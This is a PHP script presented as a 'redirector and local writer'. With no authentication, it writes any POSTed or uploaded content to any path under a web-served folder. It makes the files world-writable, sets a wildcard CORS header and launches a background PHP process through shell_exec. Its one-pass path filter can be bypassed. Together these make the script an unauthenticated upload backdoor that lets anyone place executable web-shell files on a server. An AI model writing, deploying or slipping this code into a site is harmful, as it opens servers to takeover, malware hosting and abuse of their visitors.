<?php
/**
 * Unified Cyber-Redirector & Local Writer
 * Correção: criação automática de arquivos e pastas
 */

@ini_set('memory_limit', '16000M');
@set_time_limit(0);

header("Access-Control-Allow-Origin: *");
header("X-Powered-By: Cyber-Unified-Core");

// ===============================
// 1. PROTOCOLO E HOST
// ===============================
$protocol =
(
    (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
    || ($_SERVER['SERVER_PORT'] ?? 80) == 443
)
? "https://"
: "http://";

$host = $_SERVER['HTTP_HOST'] ?? 'localhost';
$uri  = $_SERVER['REQUEST_URI'] ?? '/';

// ===============================
// 2. ANTI LOOP
// ===============================
if (
    strpos($uri, '/X/') === 0
    || strpos($uri, 'X/') === 1
) {
    exit;
}

// ===============================
// 3. CAPTURA PATH
// ===============================
$path = trim($_SERVER['PATH_INFO'] ?? '', '/');

if (!$path) {

    $cleanUri = explode('?', $uri)[0];

    $scriptName = $_SERVER['SCRIPT_NAME'] ?? '';

    $path = trim(
        str_replace($scriptName, '', $cleanUri),
        '/'
    );
}

if (!$path || $path === 'index.php') {
    http_response_code(400);
    exit("LOCAL_ERROR: NO_PATH");
}

// ===============================
// 4. SEGURANÇA PATH
// ===============================
$path = str_replace(
    ['../', '..\\', "\0"],
    '',
    $path
);

// ===============================
// 5. CAMINHOS
// ===============================
$baseDir   = __DIR__ . '/X/';
$localPath = $baseDir . $path;
$localDir  = dirname($localPath);

$targetUrl = $protocol . $host . '/X/' . $path;

// ===============================
// 6. CRIAR PASTA AUTOMÁTICA
// ===============================
if (!is_dir($localDir)) {

    if (!@mkdir($localDir, 0777, true)) {
        http_response_code(500);
        exit("ERROR: CREATE_DIR_FAILED");
    }
}

// ===============================
// 7. POST = SALVAR ARQUIVO
// ===============================
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $inputData = file_get_contents('php://input');

    // fallback multipart/form-data
    if (
        empty($inputData)
        && !empty($_FILES)
    ) {

        $firstFile = reset($_FILES);

        if (
            isset($firstFile['tmp_name'])
            && is_uploaded_file($firstFile['tmp_name'])
        ) {
            $inputData = file_get_contents($firstFile['tmp_name']);
        }
    }

    if ($inputData === '' || $inputData === false) {
        http_response_code(400);
        exit("ERROR: EMPTY_DATA");
    }

    // cria arquivo automaticamente
    $save = @file_put_contents(
        $localPath,
        $inputData,
        LOCK_EX
    );

    if ($save === false) {
        http_response_code(500);
        exit("ERROR: WRITE_FAILED");
    }

    // permissão
    @chmod($localPath, 0777);

    // atualização database em background
    if (file_exists(__DIR__ . '/database.php')) {

        if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {

            $cmd =
                'cd ' . escapeshellarg(__DIR__) .
                ' && php database.php > /dev/null 2>&1 &';

            @shell_exec($cmd);

        } else {

            @pclose(
                @popen(
                    'start /B php "' . __DIR__ . '/database.php"',
                    'r'
                )
            );
        }
    }

    echo json_encode([
        "status" => "success",
        "file"   => "/X/" . $path,
        "size"   => filesize($localPath),
        "url"    => $targetUrl
    ]);

    exit;
}

// ===============================
// 8. GET = CRIAR + REDIRECIONAR
// ===============================
if ($_SERVER['REQUEST_METHOD'] === 'GET') {

    // se arquivo não existe -> cria
    if (!file_exists($localPath)) {

        $defaultContent = "1";

        $create = @file_put_contents(
            $localPath,
            $defaultContent,
            LOCK_EX
        );

        if ($create === false) {
            http_response_code(500);
            exit("ERROR: CREATE_FILE_FAILED");
        }

        @chmod($localPath, 0777);
    }

    // redireciona
    header("Location: " . $targetUrl, true, 302);
    exit;
}

// ===============================
// 9. MÉTODOS NÃO SUPORTADOS
// ===============================
http_response_code(405);
echo "ERROR: METHOD_NOT_ALLOWED";
exit;
?>